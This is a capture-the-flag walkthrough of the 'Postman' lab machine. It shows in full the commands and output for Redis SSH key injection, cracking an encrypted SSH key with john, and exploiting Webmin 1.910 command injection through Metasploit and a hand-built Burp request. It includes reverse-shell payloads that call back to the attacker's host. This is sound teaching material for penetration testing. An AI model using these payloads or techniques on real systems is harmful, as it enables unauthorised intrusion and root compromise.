# Postman
```
Difficulty: Easy
Operating System: Linux
Hints: True
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | N/A | Nmap, Unauthenticated Redis Access | Performed an Nmap scan to discover open ports and services, identifying a Redis server on port 6379 with unauthenticated access. |
| 2 | redis | SSH Key Injection via Redis | Exploited the unauthenticated Redis server by using it to write an SSH public key to the `~/.ssh/authorized_keys` file of the `redis` user. This was achieved by changing the Redis database's working directory (`dir`) and filename (`dbfilename`) and then saving the public key. This provided an SSH shell as the `redis` user. |
| 3 | Matt | Local Enumeration, SSH Key Cracking | From the `redis` shell, local enumeration revealed an encrypted SSH private key belonging to a user named `Matt` in `/opt/id_rsa.bak`. Downloaded the key, used `ssh2john` to format it, and cracked the passphrase (`computer2008`) with `john`. Although direct SSH login with this key failed, the password was successfully used with the `su` command to switch to the `Matt` user. |
| 4 | root | `linPEAS`, Webmin RCE (1.910) | After gaining access as `Matt`, ran `linPEAS` to identify privilege escalation vectors. Discovered that the Webmin service (version 1.910) was running as `root` on port 10000. Used a known Metasploit module for Webmin 1.910 (CVE-2019-15107) and the `Matt` credentials to execute a reverse shell payload, gaining a root shell. |
| 5 | root | Manual RCE from Burp Suite | Dissected the Metasploit exploit's HTTP request in Burp Suite to understand the underlying mechanism. The exploit leveraged a command injection vulnerability in the `/package-updates/update.cgi` endpoint. The request used a URL-encoded and base64-encoded payload to execute a reverse shell command. Recreated and executed a similar, handcrafted payload to confirm the command injection and achieve a root shell manually. |


## Initial Enumeration
Running nmap scan (TCP) on the target shows the following results:
```
Host is up (0.036s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Cyber Geek's Personal Website
|_http-server-header: Apache/2.4.29 (Ubuntu)
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
As usual, let's start by digging into http webserver.  
If we run directory/file enumeration we cannot find anything, also the website seems to not have any functionality, so let's keep this for the future and look into other services.
If we look at port 10000 we get prompt for a webmin login page. We have some publicly available exploits for this, but since this exploit does not match the exact version the server is running, let's start before with redis (6379) that is discoverable only after a full port nmap scan.

## Foothold
As we dig into redis server, we can snoop some hacking tactics on [book.hacktricks.xyz](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis).
As we go through the whole enumeration, we can come to 'redis RCE - SSH'.  
Since we have unauthenticated access to redis we can generate the ssh key, drop the key as an index, and store the index inside a custom file, which can be, the ~/.ssh/authorized_keys file of the redis user.  
as described in the documentation the default redis user home directory is usually located into /var/lib/redis or /home/redis/.ssh.  
Now let's try to follow the procedure
```
[root@kali Postman ]$ ls    
dir-enum  exploits  nmap  walkthroughs  www              
[root@kali Postman ]$ echo $TARGET_DIR                                                                             
/root/Documents/HTB/Boxes/Postman                        
[root@kali Postman ]$ ssh-keygen -t rsa                  
Generating public/private rsa key pair.                  
Enter file in which to save the key (/root/.ssh/id_rsa): /root/Documents/HTB/Boxes/Postman/id_rsa_postman          
Enter passphrase (empty for no passphrase):              
Enter same passphrase again:                             
Your identification has been saved in /root/Documents/HTB/Boxes/Postman/id_rsa_postman                             
Your public key has been saved in /root/Documents/HTB/Boxes/Postman/id_rsa_postman.pub                             
The key fingerprint is:     
SHA256:TfF8pDTQd1BGPsSih3lel4ZzbmGXZZsKzl1UhTxrezI root@kali                                                       
The key's randomart image is:                            
+---[RSA 3072]----+         
|          ooo.+*O|         
|           =.=*=+|         
|          . B.=*B|         
|         o = *o%+|         
|        S + *.X.+|         
|           o +Eo.|         
|              .+ |         
|                 |         
|                 |         
+----[SHA256]-----+         
[root@kali Postman ]$ ls    
dir-enum  exploits  id_rsa_postman  id_rsa_postman.pub  nmap  walkthroughs  www                                    
[root@kali Postman ]$ (echo -e "\n\n"; cat id_rsa_postman.pub; echo -e "\n\n") > spaced_key.txt                    
[root@kali Postman ]$ cat spaced_key.txt | redis-cli -h $TARGET  -x set ssh_key  
```
Now we need to log on into redis and perform the following action:  
```
10.10.10.160:6379[2]> config get dir
1) "dir"
2) "/var/lib/redis"
10.10.10.160:6379[2]> config set dir /var/lib/redis/.ssh
OK
10.10.10.160:6379[2]> config set dbfilename "authorized_keys"
OK
10.10.10.160:6379[2]> save
OK
10.10.10.160:6379[2]>
```
now we can login to the target host as redis user, using the generated ssh key:  
```
[root@kali Postman ]$ ssh -l redis -i keys/id_rsa_postman $TARGET
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Last login: Thu Mar 17 14:30:50 2022 from 10.10.14.24
redis@Postman:~$
```

## User
Once we log in, following our standard approach, we can run linPEAS looking for possible privilege escalation vectors.    
After we run linPEAS notice some keys left around on the box, in particular the following:
```
╔══════════╣ Analyzing SSH Files (limit 70)                                                (38 results) [1024/2089]
id_dsa* Not Found

-rwxr-xr-x 1 Matt Matt 1743 Aug 26  2019 /opt/id_rsa.bak
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C
JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----
```
this key is owned by user Matt, hence, we can download it and try to log in.  
However, as we can notice in the head of the key, the key is encrypted: ```Proc-Type: 4,ENCRYPTED``` so, let's try to crack it.  
Let's use ssh2john to convert the ssh key into a crackable format, and then use john to crack the key:  
```
[root@kali keys ]$ ssh2john id_rsa_matt > id_rsa_matt_john                                  
[root@kali keys ]$ cat id_rsa_matt_john
id_rsa_matt:$sshng$0$8$73E9CEFBCCF5287C$1192$25e840e75235eebb0238e56ac96c7e0bcdfadc8381617435d43770fe9af72f6036343b41eedbec5cdcaa2838217d09d77301892540fd90a267889909cebbc5d567a9bcc3648fd648b5743360df306e396b92ed5b26ae719c95fd1146f923b936ec6b13c2c32f2b35e491f11941a5cafd3e74b3723809d71f6ebd5d5c8c9a6d72cba593a26442afaf8f8ac928e9e28bba71d9c25a1ce403f4f02695c6d5678e98cbed0995b51c206eb58b0d3fa0437fbf1b4069a6962aea4665df2c1f762614fdd6ef09cc7089d7364c1b9bda52dbe89f4aa03f1ef178850ee8b0054e8ceb37d306584a81109e73315aebb774c656472f132be55b092ced1fe08f11f25304fe6b92c21864a3543f392f162eb605b139429bb561816d4f328bb62c5e5282c301cf507ece7d0cf4dd55b2f8ad1a6bc42cf84cb0e97df06d69ee7b4de783fb0b26727bdbdcdbde4bb29bcafe854fbdbfa5584a3f909e35536230df9d3db68c90541d3576cab29e033e825dd153fb1221c44022bf49b56649324245a95220b3cae60ab7e312b705ad4add1527853535ad86df118f8e6ae49a3c17bee74a0b460dfce0683cf393681543f62e9fb2867aa709d2e4c8bc073ac185d3b4c0768371360f737074d02c2a015e4c5e6900936cca2f45b6b5d55892c2b0c4a0b01a65a5a5d91e3f6246969f4b5847ab31fa256e34d2394e660de3df310ddfc023ba30f062ab3aeb15c3cd26beff31c40409be6c7fe3ba8ca13725f9f45151364157552b7a042fa0f26817ff5b677fdd3eead7451decafb829ddfa8313017f7dc46bafaac7719e49b248864b30e532a1779d39022507d939fcf6a34679c54911b8ca789fef1590b9608b10fbdb25f3d4e62472fbe18de29776170c4b108e1647c57e57fd1534d83f80174ee9dc14918e10f7d1c8e3d2eb9690aa30a68a3463479b96099dee8d97d15216aec90f2b823b207e606e4af15466fff60fd6dae6b50b736772fdcc35c7f49e5235d7b052fd0c0db6e4e8cc6f294bd937962fab62be9fde66bf50bb149ca89996cf12a54f91b1aa2c2c6299ea9da821ef284529a5382b18d080aaede451864bb352e1fdcff981a36b505a1f2abd3a024848e0f3234ef73f3e2dda0dd7041630f695c11063232c423c7153277bbe671cb4b483f08c266fc547d89ff2b81551dabef03e6fd968a67502100111a7022ff3eb58a1fc065692d50b40eb379f155d37c1d97f6c2f5a01de13b8989174677c89d8a644758c071aea8d4c56a0374801732348db0b3164dcc82b6eaf3eb3836fa05cf5476258266a30a531e1a3132e11b944e8e0406cad59ffeaecc1ab3b7705db99353c458dc9932a638598b195e25a14051e414e20dc1510eb476a467f4e861a51036d453ea96721e0be34f4993a34b778d4111b29a63d69c1b8200869a129392684af8c4daa32f3d0a0d17c36275f039b4a3bf29e9436b912b9ed42b168c47c4205dcd00c114da8f8d82af761e69e900545eb6fc10ef1ba4934adb6fa9af17c812a8b420ed6a5b645cad812d394e93d93ccd21f2d444f1845d261796ad055c372647f0e1d8a844b8836505eb62a9b6da92c0b8a2178bad1eafbf879090c2c17e25183cf1b9f1876cf6043ea2e565fe84ae473e9a7a4278d9f00e4446e50419a641114bc626d3c61e36722e9932b4c8538da3ab44d63
[root@kali keys ]$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_matt_john       
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (id_rsa_matt)     
1g 0:00:00:00 DONE (2022-03-18 17:43) 3.448g/s 851089p/s 851089c/s 851089C/s comunista..comett
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Almost instantly we can crack the ssh key, wich is protected using the password 'computer2008'.  
Now, if we try to login using the cracked ssh key, we get something like the following:
```
[root@kali keys ]$ ssh -l Matt -i id_rsa_matt $TARGET
Enter passphrase for key 'id_rsa_matt':
Connection closed by 10.10.10.160 port 22
```
Since, after multiple tries, it really seems like we cannot login via ssh, let's try to su as Matt giving as the password the passord cracked from the ssh key.
```
redis@Postman:~$ su - Matt                                                                                                                                                                                                                   
Password:                                                  
Matt@Postman:~$
```

## Root
Once we log in as Matt, following our standard approach, we can run linPEAS looking for possible privilege escalation vectors.    
After we run linPEAS we can notice that the webmin service is running as root:
```
═══════════════════════════════════╣ Processes, Cron, Services, Timers & Sockets ╠════════════════════════════════════
╔══════════╣ Cleaned processes                            
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
root          1  0.0  0.6 159472  6320 ?        Ss   Mar17   0:04 /sbin/init splash
root        247  0.0  0.9  94940  8396 ?        S<s  Mar17   0:00 /lib/systemd/systemd-journald
root        259  0.0  0.2  45204  2100 ?        Ss   Mar17   0:00 /lib/systemd/systemd-udevd
systemd+    338  0.0  0.3 141928  3072 ?        Ssl  Mar17   0:08 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
root        339  0.0  0.2  91152  2588 ?        Ss   Mar17   0:00 /usr/bin/VGAuthService
root        340  0.0  0.3 153288  3136 ?        S<sl Mar17   1:24 /usr/bin/vmtoolsd
systemd+    342  0.0  0.2  70628  1968 ?        Ss   Mar17   0:09 /lib/systemd/systemd-resolved
root        347  0.0  0.3 289844  3036 ?        Ssl  Mar17   0:01 /usr/lib/accountsservice/accounts-daemon[0m
message+    348  0.0  0.2  50108  2200 ?        Ss   Mar17   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write                                                                         
root        352  0.0  0.2 170344  2696 ?        Ssl  Mar17   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root        354  0.0  0.4  70608  3964 ?        Ss   Mar17   0:00 /lib/systemd/systemd-logind
root        358  0.0  0.2  31320  2004 ?        Ss   Mar17   0:00 /usr/sbin/cron -f                        
syslog      363  0.0  0.2 263036  2068 ?        Ssl  Mar17   0:00 /usr/sbin/rsyslogd -n
root        623  0.0  0.3  72296  3008 ?        Ss   Mar17   0:00 /usr/sbin/sshd -D
redis     35686  0.0  0.4 108100  4232 ?        S    16:32   0:00      _ sshd: redis@pts/0
redis     35687  0.0  0.5  22540  5116 pts/0    Ss   16:32   0:00          _ -bash                
redis     35775  0.0  0.2  32308  2180 pts/0    S+   16:56   0:00              _ wget -O- http://10.10.14.24/linpeas.sh
redis     35776  1.8  0.5  14852  5328 pts/0    S+   16:56   0:00              _ bash
redis     38419  0.0  0.4  14852  3952 pts/0    S+   16:56   0:00                  _ bash
redis     38423  0.0  0.4  39824  3836 pts/0    R+   16:56   0:00                  |   _ ps fauxwww
redis     38422  0.0  0.2  14852  2312 pts/0    S+   16:56   0:00                  _ bash
root        636  0.0  0.1  16180  1304 tty1     Ss+  Mar17   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
redis       645  0.1  0.2  51572  1988 ?        Ssl  Mar17   1:59 /usr/bin/redis-server 0.0.0.0:6379
root        653  0.0  1.6 331360 15604 ?        Ss   Mar17   0:03 /usr/sbin/apache2 -k start
www-data  20662  0.0  0.9 335772  8556 ?        S    06:25   0:00  _ /usr/sbin/apache2 -k start                       
www-data  20663  0.0  0.9 335772  8556 ?        S    06:25   0:00  _ /usr/sbin/apache2 -k start
www-data  20664  0.0  0.9 335772  8556 ?        S    06:25   0:00  _ /usr/sbin/apache2 -k start
www-data  20665  0.0  0.9 335772  8556 ?        S    06:25   0:00  _ /usr/sbin/apache2 -k start
www-data  20666  0.0  0.9 335772  8556 ?        S    06:25   0:00  _ /usr/sbin/apache2 -k start
root        733  0.0  0.9  95308  9144 ?        Ss   Mar17   0:01 /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf
root      18873  0.0  4.1 118924 38500 ?        S    Mar17   0:00  _ /usr/share/webmin/package-updates/update.cgi
redis     35637  0.0  0.8  76620  7516 ?        Ss   16:32   0:00 /lib/systemd/systemd --user
redis     35638  0.0  0.1 193456  1720 ?        S    16:32   0:00  _ (sd-pam)
```
So let's get back to public available exploit and see if we can take advantage of this.  
If we do a searchsploit for webmin, we can see the following results:
```
[root@kali Postman ]$ searchsploit webmin 1.9
----------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                 |  Path
----------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure                                                                                   | multiple/remote/1997.php
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure                                                                                   | multiple/remote/2017.pl
Webmin 1.900 - Remote Command Execution (Metasploit)                                                                                           | cgi/remote/46201.rb
Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)                                                                         | linux/remote/46984.rb
Webmin 1.920 - Remote Code Execution                                                                                                           | linux/webapps/47293.sh
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                                                                                  | linux/webapps/47330.rb
Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)                                                                              | linux/remote/47230.rb
Webmin 1.962 - 'Package Updates' Escape Bypass RCE (Metasploit)                                                                                | linux/webapps/49318.rb
Webmin 1.973 - 'run.cgi' Cross-Site Request Forgery (CSRF)                                                                                     | linux/webapps/50144.py
Webmin 1.973 - 'save_user.cgi' Cross-Site Request Forgery (CSRF)                                                                               | linux/webapps/50126.py
Webmin 1.984 - Remote Code Execution (Authenticated)                                                                                           | linux/webapps/50809.py
----------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```
Since we are running webmin 1.910 we have very few options to choose from.  
Since we can see lots of metasploit modules available, let's use metasploit and try to execute some existing exploit.  
Once we run msfconsole, we can search for webmin exploit.
```
msf6 > search webmin                                                                                                                                                             

Matching Modules                                                                                                                                                                 
================                                                                                                                                                                 

   #  Name                                         Disclosure Date  Rank       Check  Description                                                                                
   -  ----                                         ---------------  ----       -----  -----------                                                                                
   0  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution                                             
   1  auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     No     Webmin File Disclosure                                                                     
   2  exploit/linux/http/webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution                                            
   3  exploit/unix/webapp/webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE                                                            
   4  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access                        
   5  exploit/linux/http/webmin_backdoor           2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor                                                        


Interact with a module by name or index. For example info 5, use 5 or use exploit/linux/http/webmin_backdoor                                                                     

```
After trying few exploits, let's use:
```
msf6 > use exploit/linux/http/webmin_packageup_rce                                                                                                                               
[*] Using configured payload cmd/unix/reverse_perl
```
now let's see the options we have and set exploit parameter accordingly:
```
msf6 exploit(linux/http/webmin_packageup_rce) > show options

Module options (exploit/linux/http/webmin_packageup_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       Webmin Password
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      10000            yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path for Webmin application
   USERNAME                    yes       Webmin Username
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Webmin <= 1.910


msf6 exploit(linux/http/webmin_packageup_rce) > set RHOSTS 10.10.10.160
RHOSTS => 10.10.10.160
msf6 exploit(linux/http/webmin_packageup_rce) > set PASSWORD computer2008
PASSWORD => computer2008
msf6 exploit(linux/http/webmin_packageup_rce) > set SSL true
[!] Changing the SSL option's value may require changing RPORT!
SSL => true
msf6 exploit(linux/http/webmin_packageup_rce) > set USERNAME Matt
USERNAME => Matt
msf6 exploit(linux/http/webmin_packageup_rce) > set LHOST tun0
LHOST => 10.10.14.24
```
After setting all the parameters properly we can hit run and get a shell as root:  
```
msf6 exploit(linux/http/webmin_packageup_rce) > run

[*] Started reverse TCP handler on 10.10.14.24:4444
[+] Session cookie: 37f00d1765b6e8c7453de8036c7865a8
[*] Attempting to execute the payload...
[*] Command shell session 1 opened (10.10.14.24:4444 -> 10.10.10.160:34784 ) at 2022-03-18 20:07:55 +0100

whoami
root
```
Now, since we are curious, let's disassemble the web request setting burp as a proxy of this exploit, and see how this works:  
```
POST /package-updates/update.cgi HTTP/1.1
Host: 10.10.10.160:10000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36
Cookie: sid=09e7f7f8d777440c6d40b1e9114b05dd
Referer: https://10.10.10.160:10000/package-updates/?xnavigation=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 290
Connection: close

u=acl%2Fapt&u=%20%7C%20bash%20-c%20%22%7becho%2cc2ggLWMgJyhzbGVlcCA0NTA4fHRlbG5ldCAxMC4xMC4xNC4yNCA0NDQ0fHdoaWxlIDogOyBkbyBzaCAmJiBicmVhazsgZG9uZSAyPiYxfHRlbG5ldCAxMC4xMC4xNC4yNCA0NDQ0ID4vZGV2L251bGwgMj4mMSAmKSc%3d%7d%7c%7bbase64%2c-d%7d%7c%7bbash%2c-i%7d%22&ok_top=Update+Selected+Packages
```
If we follow all the requests it seems quite obvious that the above request is intended to trigger a reverse shell. If we decode the payload we can see the following:
```
u=acl%2Fapt&u= | bash -c "{echo,sh -c '(sleep 4194|telnet 10.10.14.24 4444|while : ; do sh && break; done 2>&1|telnet 10.10.14.24 4444 >/dev/null 2>&1 &)'}|{base64,-d}|{bash,-i}"&ok_top=Update+Selected+Packages
```
Now let's disassemble this command execution and try to build our own exploit.  
First thing first, let's see if we can execute code, to do so, we need to have a blind evidence of it, one method is to insert a sleep and see if response times changes, so now, let's change the payload as follows:
```
u=acl%2Fapt&u= | bash -c "{echo,sh -c 'sleep 5'}"&ok_top=Update+Selected+Packages
```
we can see that sleep time gets reflected in response time, hence we still have a command execution, now let's try to build another payload:
```
u=acl%2Fapt&u= | bash -c "{ping,-c,1,10.10.14.24}"&ok_top=Update+Selected+Packages
```
if we listen with tcpdump on tun0, we can see an icmp echo request and an icmp echo reply, so, again, this means that we have trigger command execution.
Now, after few tries and a bit of debugging, let's build a similar payload as the one used by the exploit's author:
```
u=acl%2Fapt&u=+|+bash+-c+"{echo,-n,YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4yNC85MDAxIDA%2bJjE%3d}|{base64,-d}|{bash,-i}"&ok_top=Update+Selected+Packages
```
please notice that this
```
YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4yNC85MDAxIDA%2bJjE%3d
```
Is actually the url encoded and base64 encoded version of:
```
bash -i >& /dev/tcp/10.10.14.24/9001 0>&1
```
After we execute the request with the payload above, we can get our own shell as root:
```
[root@kali Postman ]$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.24] from (UNKNOWN) [10.10.10.160] 47444
bash: cannot set terminal process group (733): Inappropriate ioctl for device
bash: no job control in this shell
root@Postman:/usr/share/webmin/package-updates/#
```
